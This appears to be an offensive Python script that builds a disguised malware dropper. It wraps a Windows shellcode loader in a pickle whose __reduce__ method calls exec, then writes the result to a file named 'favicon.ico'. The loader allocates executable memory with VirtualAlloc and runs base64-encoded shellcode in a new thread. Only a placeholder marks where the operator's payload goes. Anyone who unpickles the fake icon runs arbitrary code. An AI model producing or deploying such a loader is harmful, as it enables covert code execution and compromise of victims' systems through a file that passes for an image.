import pickle
shellcode = """
import base64
import ctypes
import codecs
shellcode= "***base64 your shellcode and put!***"
shellcode = base64.b64decode(shellcode)
shellcode = codecs.escape_decode(shellcode)[0]
shellcode = bytearray(shellcode)
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
 ctypes.c_uint64(ptr), 
 buf, 
 ctypes.c_int(len(shellcode))
)
handle = ctypes.windll.kernel32.CreateThread(
 ctypes.c_int(0), 
 ctypes.c_int(0), 
 ctypes.c_uint64(ptr), 
 ctypes.c_int(0), 
 ctypes.c_int(0), 
 ctypes.pointer(ctypes.c_int(0))
)
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
"""


class A(object):
    def __reduce__(self):
        return (exec, (shellcode,))


ret = pickle.dumps(A())
with open("favicon.ico", 'wb') as img:
    img.write(ret)
